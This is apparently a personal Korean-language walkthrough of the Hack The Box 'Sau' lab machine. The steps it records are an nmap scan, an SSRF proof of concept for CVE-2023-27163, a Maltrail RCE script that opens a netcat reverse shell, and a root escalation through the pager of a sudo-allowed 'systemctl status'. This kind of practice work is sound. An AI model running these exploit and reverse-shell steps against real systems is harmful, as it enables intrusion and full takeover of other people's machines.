---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/unsolved
  - tech/lin/sudo-abuse
  - tech/payload/revshell
type: machine
platform: htb
os: linux
ip: 10.129.229.26
ports: [22, 55555]
ports_filtered: [80, 8338]
services: [http, ssh]
cves: [CVE-2023-27163]
status: unsolved
tech_count: 2
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Sau]
└─$ nnmap 10.129.229.26                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 11:11 +0900
Nmap scan report for 10.129.229.26
Host is up (0.24s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     http    Golang net/http server
| http-title: Request Baskets
|_Requested resource was /web
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Wed, 18 Mar 2026 02:12:40 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 18 Mar 2026 02:12:21 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Wed, 18 Mar 2026 02:12:22 GMT
|     Content-Length: 0
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.98%I=7%D=3/18%Time=69BA0A04%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Wed,\x2018\x20Mar\x20
SF:2026\x2002:12:21\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=\"/w
SF:eb\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\x202
SF:00\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Wed,\x2018\x20Mar\x20
SF:2026\x2002:12:22\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest
SF:,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request"
SF:)%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(FourOhFourRequest,EA,"HTTP/1\.0\x20400\x20
SF:Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Co
SF:ntent-Type-Options:\x20nosniff\r\nDate:\x20Wed,\x2018\x20Mar\x202026\x2
SF:002:12:40\x20GMT\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20n
SF:ame;\x20the\x20name\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\
SF:-_\\\.\]{1,250}\$\n")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Socks5,67,"HTTP/1\.1
SF:\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=ut
SF:f-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan
SF:,A3,"HTTP/1\.1\x20400\x20Bad\x20Request:\x20missing\x20required\x20Host
SF:\x20header\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnecti
SF:on:\x20close\r\n\r\n400\x20Bad\x20Request:\x20missing\x20required\x20Ho
SF:st\x20header");
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 199/tcp)
HOP RTT       ADDRESS
1   271.07 ms 10.10.14.1
2   271.54 ms 10.129.229.26
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.05 seconds
```

POC 다운로드

```bash
┌──(kali㉿kali)-[~/HTB/Sau]
└─$ git clone https://github.com/madhavmehndiratta/CVE-2023-27163
Cloning into 'CVE-2023-27163'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 6 (delta 0), reused 3 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (6/6), done.


┌──(kali㉿kali)-[~/HTB/Sau]
└─$ git clone https://github.com/apaz-dev/Maltrail-v0.53-RCE.git    
Cloning into 'Maltrail-v0.53-RCE'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (21/21), done.
remote: Total 24 (delta 8), reused 9 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (24/24), 6.13 KiB | 6.13 MiB/s, done.
Resolving deltas: 100% (8/8), done.


```


POC 실행
```bash
┌──(kali㉿kali)-[~/HTB/Sau/CVE-2023-27163]
└─$ python CVE-2023-27163.py http://10.129.229.26:55555 http://127.0.0.1:80
Creating a proxy basket izszct...
Basket Created!
Accessing the http://10.129.229.26:55555/izszct makes the server request to http://127.0.0.1:80
Authorization Token: cYsukMPxQ-JOm5V7WcnoBzgx7OErIlqrIP3KJwXpJasi


┌──(kali㉿kali)-[~/HTB/Sau/Maltrail-v0.53-RCE]
└─$ ./exploit.sh -t http://10.129.229.26:55555/izszct -i 10.10.14.42
[*] Start listen from ip 10.10.14.42 on port 4444




```

리버스쉘 연결 
```bash
┌──(kali㉿kali)-[~/HTB/Sau]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.42] from (UNKNOWN) [10.129.229.26] 47480
$ whoami
whoami
puma

```

user.txt 획득
![[Pasted image 20260318132102.png]]

sudo 권한 확인
```bash
$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

```

명령어 확인
```bash
$ /usr/bin/systemctl status trail.service
/usr/bin/systemctl status trail.service
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2026-03-18 02:08:54 UTC; 2h 16min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 876 (python3)
      Tasks: 8 (limit: 4662)
     Memory: 21.5M
     CGroup: /system.slice/trail.service
             ├─ 876 /usr/bin/python3 server.py
             ├─1392 /bin/sh -c logger -p auth.info -t "maltrail[876]" "Failed p…
             ├─1395 /bin/sh -c logger -p auth.info -t "maltrail[876]" "Failed p…
             ├─1399 sh
             ├─1402 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I…
             ├─1403 /bin/sh
             └─1417 /usr/bin/systemctl status trail.service

```

sudo 권한으로 root 권한 상승
```bash
$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)
● trail.service - Maltrail. Server of malicious traffic detection system
     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
     Active: active (running) since Wed 2026-03-18 02:08:54 UTC; 2h 20min ago
       Docs: https://github.com/stamparm/maltrail#readme
             https://github.com/stamparm/maltrail/wiki
   Main PID: 876 (python3)
      Tasks: 10 (limit: 4662)
     Memory: 28.2M
     CGroup: /system.slice/trail.service
             ├─ 876 /usr/bin/python3 server.py
             ├─1392 /bin/sh -c logger -p auth.info -t "maltrail[876]" "Failed p>
             ├─1395 /bin/sh -c logger -p auth.info -t "maltrail[876]" "Failed p>
             ├─1399 sh
             ├─1402 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I>
             ├─1403 /bin/sh
             ├─1424 sudo /usr/bin/systemctl status trail.service
             ├─1425 /usr/bin/systemctl status trail.service
             └─1426 pager

Mar 18 02:08:54 sau systemd[1]: Started Maltrail. Server of malicious traffic d>
Mar 18 04:21:12 sau sudo[1415]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=ro>
Mar 18 04:27:41 sau sudo[1420]:     puma : TTY=pts/0 ; PWD=/home/puma ; USER=ro>
Mar 18 04:27:41 sau sudo[1420]: pam_unix(sudo:session): session opened for user>
lines 1-23!sh
!sshh!sh
# whoami
whoami
root

```

![[Pasted image 20260318133054.png]]

